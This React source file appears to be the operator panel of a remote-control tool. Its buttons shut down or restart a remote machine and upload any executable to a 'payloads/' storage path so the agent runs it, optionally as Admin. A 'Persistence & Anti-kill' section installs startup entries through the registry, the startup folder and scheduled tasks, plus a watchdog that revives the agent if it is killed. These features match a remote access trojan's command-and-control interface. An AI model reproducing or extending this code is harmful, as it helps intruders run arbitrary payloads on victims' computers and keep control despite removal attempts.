import { useEffect, useRef, useState } from "react";
import { useDeviceCommands } from "@/hooks/use-device-commands";
import { supabase } from "@/integrations/supabase/client";
import { Power, RotateCcw, Lock, Bell, Upload, Rocket, FileUp, Loader2, Shield, ShieldCheck, KeyRound, FolderOpen, CalendarClock, RefreshCw } from "lucide-react";
import { toast } from "sonner";

export function SystemPanel({ deviceId }: { deviceId: string }) {
  const { send } = useDeviceCommands(deviceId);
  const [busy, setBusy] = useState<string | null>(null);
  const [notify, setNotify] = useState("");

  const fileRef = useRef<HTMLInputElement | null>(null);
  const [picked, setPicked] = useState<File | null>(null);
  const [args, setArgs] = useState("");
  const [elevated, setElevated] = useState(false);
  const [uploading, setUploading] = useState(false);
  const [progress, setProgress] = useState(0);

  const run = async (action: string, label: string, payload: any = {}) => {
    if (!confirm(`Run "${label}" on the remote machine?`)) return;
    setBusy(action);
    try {
      const res = await send(action, payload);
      if (res.status === "error") throw new Error(res.error ?? "failed");
      toast.success(`${label} dispatched`);
    } catch (e) {
      toast.error(e instanceof Error ? e.message : "Failed");
    } finally {
      setBusy(null);
    }
  };

  const onPick = (e: React.ChangeEvent<HTMLInputElement>) => {
    const f = e.target.files?.[0] ?? null;
    if (f && f.size > 100 * 1024 * 1024) {
      toast.error("File too large (max 100MB)");
      return;
    }
    setPicked(f);
  };

  const uploadAndLaunch = async () => {
    if (!picked) { toast.error("Pick a file first"); return; }
    if (!confirm(`Upload "${picked.name}" and launch it on the remote machine?`)) return;
    setUploading(true);
    setProgress(10);
    try {
      const id = crypto.randomUUID();
      const path = `payloads/${deviceId}/${id}-${picked.name}`;
      const { error } = await supabase.storage.from("builds").upload(path, picked, {
        cacheControl: "3600",
        upsert: false,
        contentType: picked.type || "application/octet-stream",
      });
      if (error) throw error;
      setProgress(70);
      const { data } = supabase.storage.from("builds").getPublicUrl(path);
      const url = data.publicUrl;
      setProgress(85);
      const res = await send("system.launch_file", {
        url,
        filename: picked.name,
        args,
        elevated,
      }, 60_000);
      if (res.status === "error") throw new Error(res.error ?? "agent failed");
      setProgress(100);
      toast.success(`Launched ${picked.name}`);
      setPicked(null);
      if (fileRef.current) fileRef.current.value = "";
      setArgs("");
    } catch (e: any) {
      toast.error(e.message ?? "Upload/launch failed");
    } finally {
      setUploading(false);
      setTimeout(() => setProgress(0), 1500);
    }
  };

  const Btn = ({ icon: Icon, label, action, danger, payload }: any) => (
    <button
      disabled={busy === action}
      onClick={() => run(action, label, payload)}
      className={`flex items-center gap-3 rounded-xl border px-4 py-3 text-left transition disabled:opacity-50 ${
        danger ? "border-red-500/40 bg-red-500/5 hover:bg-red-500/10" : "border-border/60 bg-card/60 hover:bg-accent"
      }`}
    >
      <Icon className={`h-5 w-5 ${danger ? "text-red-400" : "text-primary"}`} />
      <div>
        <div className="text-sm font-medium">{label}</div>
        <div className="text-[11px] text-muted-foreground">{action}</div>
      </div>
    </button>
  );

  return (
    <div className="space-y-4">
      <div className="grid gap-3 sm:grid-cols-2 lg:grid-cols-3">
        <Btn icon={Power} label="Shutdown" action="system.shutdown" danger />
        <Btn icon={RotateCcw} label="Restart" action="system.restart" danger />
        <Btn icon={Lock} label="Lock workstation" action="system.lock" />
      </div>

      {/* File upload & launch */}
      <div className="rounded-xl border border-border/60 bg-card/60 p-4 backdrop-blur-xl">
        <div className="flex items-center gap-2 text-sm font-medium">
          <Rocket className="h-4 w-4 text-primary" /> Upload & launch on agent
        </div>
        <p className="mt-1 text-xs text-muted-foreground">
          Uploads any file (.exe, .ps1, .bat, .msi…) to secure storage, then has the agent download
          and execute it on the remote machine.
        </p>

        <div className="mt-3 space-y-2">
          <div className="flex items-center gap-2">
            <input
              ref={fileRef}
              type="file"
              onChange={onPick}
              className="block w-full text-xs file:mr-3 file:rounded-md file:border file:border-border/60 file:bg-background file:px-3 file:py-1.5 file:text-xs file:font-medium hover:file:bg-accent"
            />
          </div>
          {picked && (
            <div className="rounded-md border border-border/40 bg-background/40 px-3 py-2 text-xs">
              <div className="flex items-center gap-2">
                <FileUp className="h-3.5 w-3.5 text-primary" />
                <span className="font-mono">{picked.name}</span>
                <span className="text-muted-foreground">· {(picked.size / 1024).toFixed(1)} KB</span>
              </div>
            </div>
          )}
          <div className="grid gap-2 sm:grid-cols-3">
            <input
              value={args}
              onChange={(e) => setArgs(e.target.value)}
              placeholder="Optional CLI args"
              className="sm:col-span-2 rounded-md border border-border/60 bg-input/60 px-3 py-1.5 text-sm outline-none focus:border-primary"
            />
            <label className="flex items-center gap-2 rounded-md border border-border/60 bg-background/40 px-3 py-1.5 text-xs">
              <input type="checkbox" checked={elevated} onChange={(e) => setElevated(e.target.checked)} />
              <Shield className="h-3.5 w-3.5" /> Run as Admin
            </label>
          </div>

          {uploading && (
            <div className="h-1.5 w-full overflow-hidden rounded-full bg-border/40">
              <div className="h-full bg-primary transition-all" style={{ width: `${progress}%` }} />
            </div>
          )}

          <button
            disabled={!picked || uploading}
            onClick={uploadAndLaunch}
            className="inline-flex w-full items-center justify-center gap-2 rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground hover:opacity-90 disabled:opacity-50"
          >
            {uploading ? <Loader2 className="h-4 w-4 animate-spin" /> : <Upload className="h-4 w-4" />}
            {uploading ? "Uploading & launching…" : "Upload & launch"}
          </button>
        </div>
      </div>

      {/* Notification */}
      <div className="rounded-xl border border-border/60 bg-card/60 p-4 backdrop-blur-xl">
        <div className="flex items-center gap-2 text-sm font-medium">
          <Bell className="h-4 w-4" /> Send notification
        </div>
        <div className="mt-3 flex gap-2">
          <input
            value={notify}
            onChange={(e) => setNotify(e.target.value)}
            placeholder="Message to display…"
            className="flex-1 rounded-md border border-border/60 bg-input/60 px-3 py-1.5 text-sm outline-none"
          />
          <button
            disabled={!notify.trim() || busy === "system.notify"}
            onClick={() => run("system.notify", "Notification", { message: notify }).then(() => setNotify(""))}
            className="rounded-md bg-primary px-4 py-1.5 text-sm font-medium text-primary-foreground hover:opacity-90 disabled:opacity-50"
          >
            Send
          </button>
        </div>
      </div>
      <PersistencePanel deviceId={deviceId} send={send} />
    </div>
  );
}

function PersistencePanel({ deviceId, send }: { deviceId: string; send: any }) {
  const [entries, setEntries] = useState<any[]>([]);
  const [loading, setLoading] = useState(false);
  const [acting, setActing] = useState<string | null>(null);
  const [antikillOn, setAntikillOn] = useState<boolean | null>(null);

  const refresh = async () => {
    setLoading(true);
    try {
      const res = await send("startup.status", {}, 15000);
      const r = res.result ?? {};
      setEntries(Array.isArray(r.entries) ? r.entries : []);
    } catch (e: any) {
      toast.error(e?.message ?? "Failed to load");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => { refresh(); /* eslint-disable-next-line */ }, [deviceId]);

  const act = async (action: string, label: string) => {
    setActing(action);
    try {
      const res = await send(action, {}, 30000);
      if (res.status === "error") throw new Error(res.error ?? "failed");
      toast.success(`${label} done`);
      if (action.startsWith("antikill.")) setAntikillOn(action === "antikill.enable");
      if (action.startsWith("startup.")) await refresh();
    } catch (e: any) {
      toast.error(e?.message ?? "Failed");
    } finally {
      setActing(null);
    }
  };

  const iconFor = (kind: string) =>
    kind === "registry" ? KeyRound : kind === "startup_folder" ? FolderOpen : CalendarClock;

  return (
    <div className="rounded-xl border border-border/60 bg-card/60 p-4 backdrop-blur-xl">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2 text-sm font-medium">
          <ShieldCheck className="h-4 w-4 text-primary" /> Persistence & Anti-kill
        </div>
        <button onClick={refresh} disabled={loading}
          className="inline-flex items-center gap-1 rounded-md border border-border/60 px-2 py-1 text-xs hover:bg-accent disabled:opacity-50">
          <RefreshCw className={`h-3 w-3 ${loading ? "animate-spin" : ""}`} /> Refresh
        </button>
      </div>
      <p className="mt-1 text-xs text-muted-foreground">
        Controls where the agent persists itself on the remote machine and whether it auto-restarts when killed.
      </p>

      <div className="mt-3 grid gap-2 sm:grid-cols-2">
        <button
          disabled={acting !== null}
          onClick={() => act("startup.enable", "Startup enable")}
          className="rounded-md border border-border/60 bg-background/40 px-3 py-2 text-xs hover:bg-accent disabled:opacity-50"
        >
          ✓ Enable startup (all 3 vectors)
        </button>
        <button
          disabled={acting !== null}
          onClick={() => act("startup.disable", "Startup disable")}
          className="rounded-md border border-red-500/40 bg-red-500/5 px-3 py-2 text-xs text-red-300 hover:bg-red-500/10 disabled:opacity-50"
        >
          ✗ Disable startup (remove all)
        </button>
        <button
          disabled={acting !== null}
          onClick={() => act("antikill.enable", "Anti-kill enable")}
          className="rounded-md border border-emerald-500/40 bg-emerald-500/5 px-3 py-2 text-xs text-emerald-300 hover:bg-emerald-500/10 disabled:opacity-50"
        >
          🛡 Enable anti-kill watchdog
        </button>
        <button
          disabled={acting !== null}
          onClick={() => act("antikill.disable", "Anti-kill disable")}
          className="rounded-md border border-red-500/40 bg-red-500/5 px-3 py-2 text-xs text-red-300 hover:bg-red-500/10 disabled:opacity-50"
        >
          ✗ Disable anti-kill watchdog
        </button>
      </div>

      <div className="mt-3 space-y-1.5">
        <div className="text-[11px] font-medium uppercase tracking-wide text-muted-foreground">
          Installed persistence vectors
        </div>
        {entries.length === 0 && (
          <div className="rounded-md border border-dashed border-border/40 px-3 py-3 text-center text-xs text-muted-foreground">
            {loading ? "Loading…" : "No persistence installed yet — click Enable startup."}
          </div>
        )}
        {entries.map((e: any, i: number) => {
          const Icon = iconFor(e.kind);
          return (
            <div key={i} className="flex items-center gap-2 rounded-md border border-border/40 bg-background/40 px-3 py-2 text-xs">
              <Icon className="h-3.5 w-3.5 text-primary" />
              <span className="font-medium capitalize">{(e.kind || "").replace("_", " ")}</span>
              <span className="flex-1 truncate font-mono text-[10px] text-muted-foreground">{e.path}</span>
              <span className={`rounded px-1.5 py-0.5 text-[10px] ${e.ok ? "bg-emerald-500/20 text-emerald-300" : "bg-red-500/20 text-red-300"}`}>
                {e.ok ? "OK" : "FAIL"}
              </span>
            </div>
          );
        })}
      </div>
    </div>
  );
}
